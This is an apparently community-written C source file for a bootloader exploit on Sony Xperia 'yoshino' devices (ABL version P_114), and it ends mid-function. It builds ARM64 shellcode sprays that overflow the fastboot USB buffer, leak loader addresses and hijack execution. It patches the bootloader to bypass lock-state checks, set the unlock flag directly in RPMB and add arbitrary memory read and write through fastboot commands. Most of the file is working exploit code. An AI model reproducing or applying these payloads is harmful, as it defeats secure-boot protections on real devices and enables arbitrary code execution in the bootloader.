// SPDX-License-Identifier: GPL-3.0-or-later
/*
 * target-p114.c - yoshino X_Boot_MSM8998_LA2.0_P_114 bootloader target specifics
 *
 * Copyright (C) 2025 j4nn at xdaforums
 */

static const int p114_offset = 0x30;
static const int p114_size = 0xf3f880;

static const int64_t p114_test3_hitadj = -0x97ffedb3LL + 0x28E64LL - 4LL;
static const int p114_stage1_cont = 0x28DC8;
static const char p114_test4_cmd[] = "flash:fb";


static void p114_setup_test2(unsigned char *buff, int size, int offset)
{
    int i;

    memset(buff, 0, size);

    for (i = (offset % 0x80); i < size; i += 0x80) {
        OPCODE(buff + i + 0x00, 0x01, 0x00, 0x00, 0x94);        // bl     #0x04 = [ 01 00 00 94 ]
        OPCODE(buff + i + 0x04, 0xe2, 0xff, 0xff, 0x10);        // adr    x2, #-0x04 = [ e2 ff ff 10 ]
        OPCODE(buff + i + 0x08, 0xc2, 0x03, 0x02, 0xcb);        // sub    x2, lr, x2 = [ c2 03 02 cb ]
        OPCODE(buff + i + 0x0c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x10, 0xfd, 0xff, 0xff, 0x97);        // bl     #-0x0c = [ fd ff ff 97 ]
        OPCODE(buff + i + 0x14, 0xe0, 0xff, 0xb2, 0xd2);        // movz   x0, #0x97ff, lsl #16 = [ e0 ff b2 d2 ]    code "B3 ED FF 97" is a call to return
        OPCODE(buff + i + 0x18, 0x60, 0xb6, 0x9d, 0xf2);        // movk   x0, #0xedb3 = [ 60 b6 9d f2 ]             fastboot FAIL response - search for it
        OPCODE(buff + i + 0x1c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x20, 0xf9, 0xff, 0xff, 0x97);        // bl     #-0x1c = [ f9 ff ff 97 ]
        OPCODE(buff + i + 0x24, 0xfe, 0xff, 0xff, 0xf0);        // adrp   lr, #-0x1000 = [ fe ff ff f0 ]
        OPCODE(buff + i + 0x28, 0xc1, 0x47, 0x40, 0xb8);        // ldr    w1, [lr], #4 = [ c1 47 40 b8 ]
        OPCODE(buff + i + 0x2c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x30, 0xf5, 0xff, 0xff, 0x97);        // bl     #-0x2c = [ f5 ff ff 97 ]
        OPCODE(buff + i + 0x34, 0x3f, 0x00, 0x00, 0x6b);        // cmp    w1, w0 = [ 3f 00 00 6b ]
        OPCODE(buff + i + 0x38, 0x81, 0xff, 0xff, 0x54);        // b.ne   #-0x10 = [ 81 ff ff 54 ]                  lr = 0x28E68, i.e. addr of code after
        OPCODE(buff + i + 0x3c, 0x06, 0x00, 0x00, 0x14);        // b      #0x18 = [ 06 00 00 14 ]                   the call to return fb FAIL response

        OPCODE(buff + i + 0x40, 0xf1, 0xff, 0xff, 0x97);        // bl     #-0x3c = [ f1 ff ff 97 ]
        snprintf(buff + i + 0x44, 5+7, "vxyz%06x-", i);         // "f3ce40-e40-" "vxyzf3ce40-"

        OPCODE(buff + i + 0x50, 0xed, 0xff, 0xff, 0x97);        // bl     #-0x4c = [ ed ff ff 97 ]
        OPCODE(buff + i + 0x54, 0xa0, 0xff, 0xff, 0x10);        // adr    x0, #-0x0c = [ a0 ff ff 10 ]
        OPCODE(buff + i + 0x58, 0x61, 0xff, 0xff, 0x10);        // adr    x1, #-0x14 = [ 61 ff ff 10 ]
        OPCODE(buff + i + 0x5c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x60, 0xe9, 0xff, 0xff, 0x97);        // bl     #-0x5c = [ e9 ff ff 97 ]
        OPCODE(buff + i + 0x64, 0x42, 0xfc, 0x44, 0xd3);        // lsr    x2, x2, #4 = [ 42 fc 44 d3 ]
        OPCODE(buff + i + 0x68, 0x21, 0x00, 0x02, 0x8b);        // add    x1, x1, x2 = [ 21 00 02 8b ]
        OPCODE(buff + i + 0x6c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x70, 0xe5, 0xff, 0xff, 0x97);        // bl     #-0x6c = [ e5 ff ff 97 ]
        OPCODE(buff + i + 0x74, 0x14, 0x1e, 0x89, 0xd2);        // movz   x20, #0x48f0 = [ 14 1e 89 d2 ]
        OPCODE(buff + i + 0x78, 0xd4, 0x03, 0x14, 0xcb);        // sub    x20, lr, x20 = [ d4 03 14 cb ]            x20 points to code to return our fb
        OPCODE(buff + i + 0x7c, 0x80, 0x02, 0x1f, 0xd6);        // br     x20 = [ 80 02 1f d6 ]                     response - link back to 0x28E68
    }
}

static void p114_setup_test3(unsigned char *buff, int size, int offset)
{
    int i, j;

    memset(buff, 0, size);

    for (i = offset; i < size; i += 0x80) {
        for (j = 0; j < 0x4c; j += 4)
            OPCODE(buff + i + j, 0x1f, 0x20, 0x03, 0xd5);       // nop = [ 1f 20 03 d5 ]

        OPCODE(buff + i + 0x4c, 0xe2, 0xff, 0xb2, 0xd2);        // movz   x2, #0x97ff, lsl #16 = [ e2 ff b2 d2 ]    code "B3 ED FF 97" is a call to return
        OPCODE(buff + i + 0x50, 0x62, 0xb6, 0x9d, 0xf2);        // movk   x2, #0xedb3 = [ 62 b6 9d f2 ]             fastboot FAIL response - search for it
        OPCODE(buff + i + 0x54, 0x63, 0xfd, 0xff, 0x10);        // adr    x3, #-0x54 = [ 63 fd ff 10 ]
        OPCODE(buff + i + 0x58, 0x61, 0x7c, 0x40, 0xb9);        // ldr    w1, [x3, #0x7c] = [ 61 7c 40 b9 ]         offset of current block vs offs string
        OPCODE(buff + i + 0x5c, 0x60, 0x00, 0x01, 0xcb);        // sub    x0, x3, x1 = [ 60 00 01 cb ]              addr of our resp. str. in usb buff
        OPCODE(buff + i + 0x60, 0x61, 0x4c, 0x40, 0xb8);        // ldr    w1, [x3, #0x04]! = [ 61 4c 40 b8 ]
        OPCODE(buff + i + 0x64, 0x3f, 0x00, 0x02, 0x6b);        // cmp    w1, w2 = [ 3f 00 02 6b ]
        OPCODE(buff + i + 0x68, 0xc1, 0xff, 0xff, 0x54);        // b.ne   #-0x08 = [ c1 ff ff 54 ]                  x3 = call to return fb FAIL (0x28E64)
        OPCODE(buff + i + 0x6c, 0xc1, 0x03, 0x03, 0xcb);        // sub    x1, lr, x3 = [ c1 03 03 cb ]
        OPCODE(buff + i + 0x70, 0x21, 0x00, 0x02, 0x8b);        // add    x1, x1, x2 = [ 21 00 02 8b ]
        OPCODE(buff + i + 0x74, 0x01, 0x70, 0x00, 0xf8);        // str    x1, [x0, #0x07] = [ 01 70 00 f8 ]
        OPCODE(buff + i + 0x78, 0x60, 0x00, 0x1f, 0xd6);        // br     x3 = [ 60 00 1f d6 ]                      jump back to 0x28E64
        *(uint32_t *)(buff + i + 0x7c) = i - (i / 0x80 * 16);

        snprintf(buff + (i / 0x80 * 16), 8, "%06x:", i);
    }
}

static void p114_setup_test4(unsigned char *buff, int size, int offset, int payloadsize)
{
    int i;

    memset(buff, 0, 0x80);

    for (i = (offset % 0x80); i < size; i += 0x80) {
        OPCODE(buff + i + 0x00, 0x0a, 0x00, 0x00, 0x10);        // adr    x10, #0x00 = [ 0a 00 00 10 ]              x10 == buff
        OPCODE(buff + i + 0x04, 0x40, 0x75, 0x40, 0xb9);        // ldr    w0, [x10, #0x74] = [ 40 75 40 b9 ]        w14 == offset of exploit_continue, w0 == LinuxLoader code size
        OPCODE(buff + i + 0x08, 0x4e, 0x35, 0x4f, 0x29);        // ldp    w14, w13, [x10, #0x78] = [ 4e 35 4f 29 ]  w13 == offset of fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x0c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x10, 0xfc, 0xff, 0xff, 0x17);        // b      #-0x10 = [ fc ff ff 17 ]
        OPCODE(buff + i + 0x14, 0x7f, 0x00, 0x00, 0xeb);        // cmp    x3, x0 = [ 7f 00 00 eb ]                  check if called from alternate code path with size in x3
        OPCODE(buff + i + 0x18, 0x61, 0x00, 0x00, 0x54);        // b.ne   #0x0c = [ 61 00 00 54 ]                   if not.eq it is the first call of this code
        OPCODE(buff + i + 0x1c, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return not doing anything for the 2nd invokation of this

        OPCODE(buff + i + 0x20, 0xf8, 0xff, 0xff, 0x17);        // b      #-0x20 = [ f8 ff ff 17 ]
        OPCODE(buff + i + 0x24, 0x3f, 0x00, 0x08, 0x71);        // cmp    w1, #0x200 = [ 3f 00 08 71 ]              check if called from alternate code path as 1st invocation
        OPCODE(buff + i + 0x28, 0x81, 0x00, 0x00, 0x54);        // b.ne   #0x10 = [ 81 00 00 54 ]
        OPCODE(buff + i + 0x2c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x30, 0xf4, 0xff, 0xff, 0x17);        // b      #-0x30 = [ f4 ff ff 17 ]
        OPCODE(buff + i + 0x34, 0xde, 0xf3, 0x02, 0xd1);        // sub    lr, lr, 0xbc = [ de f3 02 d1 ]            called from alt code path 1st inv., adjust LR to &exploit_continue
        OPCODE(buff + i + 0x38, 0xce, 0x03, 0x0e, 0xcb);        // sub    x14, lr, x14 = [ ce 03 0e cb ]            x14 == LinuxLoader base addr
        OPCODE(buff + i + 0x3c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x40, 0xf0, 0xff, 0xff, 0x17);        // b      #-0x40 = [ f0 ff ff 17 ]
        OPCODE(buff + i + 0x44, 0xcc, 0x69, 0x6d, 0xf8);        // ldr    x12, [x14, x13] = [ cc 69 6d f8 ]         x12 = orig fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x48, 0xce, 0x69, 0x2d, 0xf8);        // str    x14, [x14, x13] = [ ce 69 2d f8 ]         fastboot_download_512MB_buffer_ptr = LinuxLoader base addr
        OPCODE(buff + i + 0x4c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x50, 0xec, 0xff, 0xff, 0x17);        // b      #-0x50 = [ ec ff ff 17 ]
        OPCODE(buff + i + 0x54, 0x2b, 0x22, 0xa2, 0x52);        // movz   w11, #0x1111, lsl #16 = [ 2b 22 a2 52 ]
        OPCODE(buff + i + 0x58, 0x2b, 0x22, 0x82, 0x72);        // movk   w11, #0x1111 = [ 2b 22 82 72 ]
        OPCODE(buff + i + 0x5c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x60, 0xe8, 0xff, 0xff, 0x17);        // b      #-0x60 = [ e8 ff ff 17 ]
        //OPCODE(buff + i + 0x64, 0x8f, 0x01, 0x0b, 0x8b);        // add    x15, x12, x11 = [ 8f 01 0b 8b ]           x15 == orig fastboot_download_512MB_buffer_ptr + 0x11111111
        OPCODE(buff + i + 0x64, 0xcf, 0x01, 0x0b, 0x8b);        // add    x15, x14, x11 = [ cf 01 0b 8b ]           x15 == LinuxLoader base addr + 0x11111111
        OPCODE(buff + i + 0x68, 0x6f, 0x32, 0x00, 0xa9);        // stp    x15, x12, [x19] = [ 6f 32 00 a9 ]         *hexlengthptr = x15;   *(hexlengthptr + 8) = x12
        OPCODE(buff + i + 0x6c, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return to &exploit_continue

        OPCODE(buff + i + 0x70, 0xe4, 0xff, 0xff, 0x17);        // b      #-0x70 = [ e4 ff ff 17 ]
        *(uint32_t *)(buff + i + 0x74) = payloadsize;           //                                                  size of code section of the LinuxLoader.pe
        *(uint32_t *)(buff + i + 0x78) = p114_stage1_cont;      //                                                  offset of exploit_continue
        *(uint32_t *)(buff + i + 0x7c) = 0xFB658;               //                                                  offset of fastboot_download_512MB_buffer_ptr
    }
}

static void p114_setup_test5(unsigned char *buff, int size, int offset, int payloadsize)
{
    int i, j;

    memset(buff, 0, size);

    // offset == 0xfc (-0x04) seems to work good for both exploit hit variants
    // with size set to 0xf3f4fc

    i = offset >= 0x100000 ? offset : 0x100000 + (offset % 0x80);
    for (; i < size; i += 0x80) {
        for (j = 0; j < 0x4c; j += 4)
            OPCODE(buff + i + j, 0x1f, 0x20, 0x03, 0xd5);       // nop = [ 1f 20 03 d5 ]

        OPCODE(buff + i - 0x100000 + 0x3c, 0x04,0x00,0x00,0x14);// b   #0x10 = [ 04 00 00 14 ]
        *(uint32_t *)(buff + i - 0x100000 + 0x40) = payloadsize;//                                                  size of code section of the LinuxLoader.pe
        *(uint32_t *)(buff + i - 0x100000 + 0x44) = p114_stage1_cont;//                                             offset of exploit_continue
        *(uint32_t *)(buff + i - 0x100000 + 0x48) = 0xFB658;    //                                                  offset of fastboot_download_512MB_buffer_ptr

        OPCODE(buff + i + 0x4c, 0x0a, 0x00, 0x80, 0x10);        // adr    x10, #-0x100000 = [ 0a 00 80 10 ]         x10 == buff + i + 0x4c - 0x100000
        OPCODE(buff + i + 0x50, 0x40, 0x41, 0x5f, 0xb8);        // ldr    w0, [x10, #-0x0c] = [ 40 41 5f b8 ]       w14 == offset of exploit_continue, w0 == LinuxLoader code size
        OPCODE(buff + i + 0x54, 0x4e, 0x35, 0x7f, 0x29);        // ldp    w14, w13, [x10, #-0x08] = [ 4e 35 7f 29 ] w13 == offset of fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x58, 0x7f, 0x00, 0x00, 0xeb);        // cmp    x3, x0 = [ 7f 00 00 eb ]                  check if called from alternate code path with size in x3
        OPCODE(buff + i + 0x5c, 0x00, 0x01, 0x00, 0x54);        // b.eq   #0x20 = [ 00 01 00 54 ]                   if eq it is the second call of this code -> jmp to return
        OPCODE(buff + i + 0x60, 0x3f, 0x00, 0x08, 0x71);        // cmp    w1, #0x200 = [ 3f 00 08 71 ]              check if called from alternate code path as 1st invocation
        OPCODE(buff + i + 0x64, 0x41, 0x00, 0x00, 0x54);        // b.ne   #0x08 = [ 41 00 00 54 ]
        OPCODE(buff + i + 0x68, 0xde, 0xf3, 0x02, 0xd1);        // sub    lr, lr, #0xbc = [ de f3 02 d1 ]           called from alt code path 1st inv., adjust LR to &exploit_continue
        OPCODE(buff + i + 0x6c, 0xce, 0x03, 0x0e, 0xcb);        // sub    x14, lr, x14 = [ ce 03 0e cb ]            x14 == LinuxLoader base addr
        OPCODE(buff + i + 0x70, 0xcc, 0x69, 0x6d, 0xf8);        // ldr    x12, [x14, x13] = [ cc 69 6d f8 ]         x12 = orig fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x74, 0xce, 0x69, 0x2d, 0xf8);        // str    x14, [x14, x13] = [ ce 69 2d f8 ]         fastboot_download_512MB_buffer_ptr = LinuxLoader base addr
        OPCODE(buff + i + 0x78, 0x7e, 0x32, 0x00, 0xa9);        // stp    lr, x12, [x19] = [ 7e 32 00 a9 ]          *hexlengthptr = lr;   *(hexlengthptr + 8) = x12
        OPCODE(buff + i + 0x7c, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return to &exploit_continue
    }
}

static void p114_test8_patch(unsigned char *ablcode, int size, int offset);

static void p114_patch_abl(unsigned char *ablcode, int extended)
{
        OPCODE(ablcode + 0x264A4 + 0x00, 0x1e, 0x00, 0x00, 0x14);  // b     #0x78 = [ 1e 00 00 14 ]                 skip "Remap recovery => FOTAKernel" functionality in favor of our code,
        //OPCODE(ablcode + 0x264D0 + 0x00, 0x1f, 0x20, 0x03, 0xd5);  // nop = [ 1f 20 03 d5 ]                         skipping also "Flashing is not allowed in Lock State" error
        OPCODE(ablcode + 0x2655C + 0x00, 0x81, 0x07, 0x00, 0x54);  // b.ne  #0xf0 = [ 81 07 00 54 ]                 skip few more checks in favor of our code (0x26560..0x26648+4 available)

        // exploit_2nd_phase_start: first invalidate ABL LinuxLoader code range
        // this is triggered by "flash:fb" command that would normally result with "No such partition." error
        OPCODE(ablcode + 0x26560 + 0x00, 0xc0, 0xfe, 0xff, 0xd0);  // adrp  x0, #-0x26000 = [ c0 fe ff d0 ]
        OPCODE(ablcode + 0x26560 + 0x04, 0x01, 0x9c, 0x43, 0x91);  // add   x1, x0, #0xe7000 = [ 01 9c 43 91 ]      Code boundary of LinuxLoader-p114.pe is 0x000e7000
        OPCODE(ablcode + 0x26560 + 0x08, 0x48, 0x19, 0x00, 0x94);  // bl    #0x6520 = [ 48 19 00 94 ]
        OPCODE(ablcode + 0x26560 + 0x0c, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x26560 + 0x10, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x26560 + 0x14, 0xab, 0xff, 0xff, 0x54);  // b.lt  #-0x0c = [ ab ff ff 54 ]
        OPCODE(ablcode + 0x26560 + 0x18, 0x61, 0xb2, 0x00, 0x94);  // bl    #0x2c984 = [ 61 b2 00 94 ]

        // restore original value of fastboot_download_512MB_buffer_ptr stored previously into "usb command buffer + 0x11" (x19 now points after "flash:" cmd, i.e. 0x06+0x0b=0x11)
        OPCODE(ablcode + 0x26560 + 0x1c, 0x64, 0xb2, 0x40, 0xf8);  // ldr   x4, [x19, #0x0b] = [ 64 b2 40 f8 ]      orig fastboot_download_512MB_buffer_ptr

        OPCODE(ablcode + 0x26560 + 0x20, 0xa2, 0x06, 0x00, 0xb0);  // adrp  x2, #0xd5000 = [ a2 06 00 b0 ]          fastboot_download_512MB_buffer_ptr@PAGE  (0xFB658)
        OPCODE(ablcode + 0x26560 + 0x24, 0x42, 0x60, 0x19, 0x91);  // add   x2, x2, #0x658 = [ 42 60 19 91 ]        fastboot_download_512MB_buffer_ptr@POFF  (0xFB658)
        OPCODE(ablcode + 0x26560 + 0x28, 0x44, 0x04, 0x00, 0xf9);  // str   x4, [x2, #0x08] = [ 44 04 00 f9 ]       restore orig fastboot_download_512MB_buffer_ptr

        // send base addr of LinuxLoader as hex string after the FAIL fastboot response
        // and also address of usb command buffer that can overflow
        // .text:00000000000AFA8F DCB "%x/%x",0xA,0
        OPCODE(ablcode + 0x26560 + 0x2c, 0xc3, 0xfe, 0xff, 0xd0);  // adrp  x3, #-0x26000 = [ c3 fe ff d0 ]
        OPCODE(ablcode + 0x26560 + 0x30, 0xe0, 0x03, 0x00, 0x91);  // add   x0, sp, #0x00 = [ e0 03 00 91 ]         we have 0x198 bytes available on stack in "No such partition." handler
        OPCODE(ablcode + 0x26560 + 0x34, 0x01, 0x03, 0x80, 0x52);  // mov   w1, #0x18 = [ 01 03 80 52 ]
        OPCODE(ablcode + 0x26560 + 0x38, 0x42, 0x04, 0x00, 0xb0);  // adrp  x2, #0x89000 = [ 42 04 00 b0 ]          "%x/%x\n"@PAGE
        OPCODE(ablcode + 0x26560 + 0x3c, 0x42, 0x3c, 0x2a, 0x91);  // add   x2, x2, #0xa8f = [ 42 3c 2a 91 ]        "%x/%x\n"@POFF
        OPCODE(ablcode + 0x26560 + 0x40, 0x64, 0x1a, 0x00, 0xd1);  // sub   x4, x19, #0x06 = [ 64 1a 00 d1 ]        substract legth of "flash:" command
        OPCODE(ablcode + 0x26560 + 0x44, 0xaa, 0x6e, 0xff, 0x97);  // bl    #-0x24558 = [ aa 6e ff 97 ]             snprintf
        OPCODE(ablcode + 0x26560 + 0x48, 0xe0, 0x03, 0x00, 0x91);  // add   x0, sp, #0x00 = [ e0 03 00 91 ]
        OPCODE(ablcode + 0x26560 + 0x4c, 0xab, 0xff, 0xff, 0x17);  // b     #-0x154 = [ ab ff ff 17 ]

        // patch debug logging verbosity check to always be the most verbose
        OPCODE(ablcode + 0x07CE8 + 0x00, 0x00, 0x00, 0x80, 0x12);  // mov   w0, #-1 = [ 00 00 80 12 ]
        OPCODE(ablcode + 0x07CE8 + 0x04, 0xc0, 0x03, 0x5f, 0xd6);  // ret = [ c0 03 5f d6 ]



        // patch the "oem unlock" command to directly set unlock state with 'X' for 0 (locked) or with 'Y' for 1 (unlocked)
        OPCODE(ablcode + 0x4D9E4 + 0x00, 0x62, 0x06, 0x40, 0x39);  // ldrb  w2, [x19, #0x01] = [ 62 06 40 39 ]
        OPCODE(ablcode + 0x4D9E4 + 0x04, 0x42, 0x60, 0x01, 0x51);  // sub   w2, w2, #0x58 = [ 42 60 01 51 ]         'X' or 'Y' aka "locked" or "unlocked"
        OPCODE(ablcode + 0x4D9E4 + 0x08, 0x5f, 0x04, 0x00, 0x71);  // cmp   w2, #0x01 = [ 5f 04 00 71 ]
        OPCODE(ablcode + 0x4D9E4 + 0x0c, 0x88, 0x01, 0x00, 0x54);  // b.hi  #0x30 = [ 88 01 00 54 ]
        OPCODE(ablcode + 0x4D9E4 + 0x10, 0x21, 0x05, 0x00, 0xd0);  // adrp  x1, #0xa6000 = [ 21 05 00 d0 ]          locate the struct with bootloader state flag (0xF3B78)
        OPCODE(ablcode + 0x4D9E4 + 0x14, 0x21, 0xe0, 0x2d, 0x91);  // add   x1, x1, #0xb78 = [ 21 e0 2d 91 ]
        OPCODE(ablcode + 0x4D9E4 + 0x18, 0x22, 0x34, 0x00, 0x39);  // strb  w2, [x1, #13] = [ 22 34 00 39 ]         set the bootloader unlock state
        OPCODE(ablcode + 0x4D9E4 + 0x1c, 0x02, 0x33, 0x81, 0x52);  // mov   w2, #0x998 = [ 02 33 81 52 ]
        OPCODE(ablcode + 0x4D9E4 + 0x20, 0x20, 0x00, 0x80, 0x52);  // mov   w0, #0x01 = [ 20 00 80 52 ]
        OPCODE(ablcode + 0x4D9E4 + 0x24, 0xba, 0x28, 0xff, 0x97);  // bl    #-0x35d18 = [ ba 28 ff 97 ]             commit the changes to rpmb
        OPCODE(ablcode + 0x4D9E4 + 0x28, 0x55, 0x00, 0x00, 0x14);  // b     #0x154 = [ 55 00 00 14 ]                jump to "Failed to set MASTER_RESET to 0x02 on rooted unit!"
                                                                   //                                               debug log with OKAY fastboot response

        // patch "erase:" command to set download mode usb buffer address
        // "erase:0xhexaddr" for data from host to device (normal behavior of "download:" command)
        // "erase:0Xhexaddr" for data from device to host (upload behavior of "download:" command)
        OPCODE(ablcode + 0x28298 + 0x00, 0xc1, 0x02, 0x40, 0x39);  // ldrb  w1, [x22] = [ c1 02 40 39 ]
        OPCODE(ablcode + 0x28298 + 0x04, 0x3f, 0xc0, 0x00, 0x71);  // cmp   w1, #0x30 = [ 3f c0 00 71 ]             '0'
        OPCODE(ablcode + 0x28298 + 0x08, 0x81, 0x03, 0x00, 0x54);  // b.ne  #0x70 = [ 81 03 00 54 ]
        OPCODE(ablcode + 0x28298 + 0x0c, 0xc1, 0x06, 0x40, 0x39);  // ldrb  w1, [x22, #0x01] = [ c1 06 40 39 ]
        OPCODE(ablcode + 0x28298 + 0x10, 0x3f, 0x60, 0x01, 0x71);  // cmp   w1, #0x58 = [ 3f 60 01 71 ]             'X'
        OPCODE(ablcode + 0x28298 + 0x14, 0x62, 0x00, 0x80, 0x52);  // mov   w2, #0x03 = [ 62 00 80 52 ]             0x03 for the init state of upload mode
        OPCODE(ablcode + 0x28298 + 0x18, 0x42, 0x00, 0x9f, 0x1a);  // csel  w2, w2, wzr, eq = [ 42 00 9f 1a ]       set our flag to init upload (0x02) instead of download (0x00)
        OPCODE(ablcode + 0x28298 + 0x1c, 0x95, 0x06, 0x00, 0xf0);  // adrp  x21, #0xd3000 = [ 95 06 00 f0 ]         fastboot_download_mode_init_upload@PAGE (0xFBE62)
        OPCODE(ablcode + 0x28298 + 0x20, 0xa2, 0x8a, 0x39, 0x39);  // strb  w2, [x21, #0xe62] = [ a2 8a 39 39 ]     fastboot_download_mode_init_upload@POFF setup our new flag
        OPCODE(ablcode + 0x28298 + 0x24, 0xe0, 0x03, 0x16, 0xaa);  // mov   x0,x22 = [ e0 03 16 aa ]
        OPCODE(ablcode + 0x28298 + 0x28, 0x2e, 0x7a, 0xff, 0x97);  // bl    #-0x21748 = [ 2e 7a ff 97 ]             convert string to integer
        OPCODE(ablcode + 0x28298 + 0x2c, 0xa3, 0x2e, 0x43, 0xf9);  // ldr   x3, [x21, #0x658] = [ a3 2e 43 f9 ]     fastboot_download_512MB_buffer_ptr@POFF (0xFB658)
        OPCODE(ablcode + 0x28298 + 0x30, 0xa0, 0x2e, 0x03, 0xf9);  // str   x0, [x21, #0x658] = [ a0 2e 03 f9 ]     fastboot_download_512MB_buffer_ptr@POFF
        OPCODE(ablcode + 0x28298 + 0x34, 0xe0, 0x03, 0x01, 0x91);  // add   x0, sp, #0x40 = [ e0 03 01 91 ]
        OPCODE(ablcode + 0x28298 + 0x38, 0x01, 0x08, 0x80, 0x52);  // mov   w1, #0x40 = [ 01 08 80 52 ]
        OPCODE(ablcode + 0x28298 + 0x3c, 0x62, 0x04, 0x00, 0xb0);  // adrp  x2, #0x8d000 = [ 62 04 00 b0 ]          (" 0x%llx" + 1)@PAGE
        OPCODE(ablcode + 0x28298 + 0x40, 0x42, 0x38, 0x16, 0x91);  // add   x2, x2, #0x58e = [ 42 38 16 91 ]        (" 0x%llx" + 1)@POFF  (==0xB558D+1)
        OPCODE(ablcode + 0x28298 + 0x44, 0x5c, 0x67, 0xff, 0x97);  // bl    #-0x26290 = [ 5c 67 ff 97 ]             snprintf
        OPCODE(ablcode + 0x28298 + 0x48, 0xe0, 0x03, 0x01, 0x91);  // add   x0, sp, #0x40 = [ e0 03 01 91 ]
        OPCODE(ablcode + 0x28298 + 0x4c, 0xdc, 0xff, 0xff, 0x17);  // b     #-0x90 = [ dc ff ff 17 ]                exit with fastboot FAIL with prev big usb buff addr


        // patch "Download Finished" to invalidate data cache of the whole region just transferred via "download" command
        // and also invalidate instruction cache
        OPCODE(ablcode + 0x24B3C + 0x00, 0xc0, 0x1e, 0x40, 0xf9);  // ldr   x0, [x22, #0x38] = [ c0 1e 40 f9 ]      fastboot_download_512MB_buffer_ptr  (0xFB658)
        OPCODE(ablcode + 0x24B3C + 0x04, 0x01, 0x00, 0x0c, 0x8b);  // add   x1, x0, x12 = [ 01 00 0c 8b ]
        OPCODE(ablcode + 0x24B3C + 0x08, 0xd1, 0x1f, 0x00, 0x94);  // bl    #0x7f44 = [ d1 1f 00 94 ]
        OPCODE(ablcode + 0x24B3C + 0x0c, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x24B3C + 0x10, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x24B3C + 0x14, 0xab, 0xff, 0xff, 0x54);  // b.lt  #-0x0c = [ ab ff ff 54 ]
        OPCODE(ablcode + 0x24B3C + 0x18, 0xea, 0xb8, 0x00, 0x94);  // bl    #0x2e3a8 = [ ea b8 00 94 ]
#ifdef LILAC_READONLY_SURVEY
        /* Read-only experiment: bypass post-transfer source invalidation.
         * NOT suitable for loading or executing newly written code. */
        OPCODE(ablcode + 0x24B3C, 0x07, 0x00, 0x00, 0x14); // b 0x24B58
#endif
// 024B58 81 04 00 90 21 80 01 91                 ADRL            X1, aDownloadFinish ; "Download Finished\n"



        OPCODE(ablcode + 0x28DDC + 0x00, 0xe0, 0x0a, 0x61, 0x39);  // ldrb  w0, [x23, #0x842] = [ e0 0a 61 39 ]     fastboot_download_mode_init_upload
        OPCODE(ablcode + 0x28DDC + 0x04, 0x21, 0x00, 0x80, 0x52);  // mov   w1, #0x01 = [ 21 00 80 52 ]
        OPCODE(ablcode + 0x28DDC + 0x08, 0x1f, 0x00, 0x1f, 0x6b);  // cmp   w0, wzr = [ 1f 00 1f 6b ]               set mode to normal download (0x01) or our new upload (0x03)
        OPCODE(ablcode + 0x28DDC + 0x0c, 0x20, 0x00, 0x80, 0x1a);  // csel  w0, w1, w0, eq = [ 20 00 80 1a ]        (value 0x03 have been set from "erase:0X" as a flag to init_upload)
        OPCODE(ablcode + 0x28DDC + 0x10, 0x6b, 0x06, 0x00, 0x90);  // adrp  x11, #0xcc000 = [ 6b 06 00 90 ]         fastboot_download_mode_512MB_active@PAGE (0xF4618)
        OPCODE(ablcode + 0x28DDC + 0x14, 0x60, 0x61, 0x18, 0x39);  // strb  w0, [x11, #0x618] = [ 60 61 18 39 ]     fastboot_download_mode_512MB_active
        OPCODE(ablcode + 0x28DDC + 0x18, 0xc0, 0x03, 0x00, 0x54);  // b.eq  #0x78 = [ c0 03 00 54 ]                 extend down here to clean data cache before starting upload

        OPCODE(ablcode + 0x28DDC + 0x1c, 0xe0, 0x1e, 0x40, 0xf9);  // ldr   x0, [x23, #0x38] = [ e0 1e 40 f9 ]      fastboot_download_512MB_buffer_ptr
        OPCODE(ablcode + 0x28DDC + 0x20, 0x01, 0x00, 0x08, 0x8b);  // add   x1, x0, x8 = [ 01 00 08 8b ]            size of the transfer is in x8
        OPCODE(ablcode + 0x28DDC + 0x24, 0x22, 0x0f, 0x00, 0x94);  // bl    #0x3c88 = [ 22 0f 00 94 ]               clean data cache to push changes to ram
        OPCODE(ablcode + 0x28DDC + 0x28, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x28DDC + 0x2c, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x28DDC + 0x30, 0xab, 0xff, 0xff, 0x54);  // b.lt  #-0x0c = [ ab ff ff 54 ]
